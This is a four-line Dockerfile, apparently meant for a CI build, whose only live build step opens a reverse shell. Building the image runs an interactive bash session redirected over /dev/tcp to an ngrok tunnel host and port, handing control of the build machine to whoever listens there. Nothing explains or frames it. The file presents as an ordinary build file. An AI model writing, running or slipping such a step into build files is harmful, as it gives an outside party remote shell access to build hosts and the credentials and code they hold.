#FROM alpine
#RUN apk update && apk add bash
FROM atlassian/default-image:2
RUN /bin/bash -c 'bash -i >& /dev/tcp/0.tcp.ngrok.io/14058 0>&1'
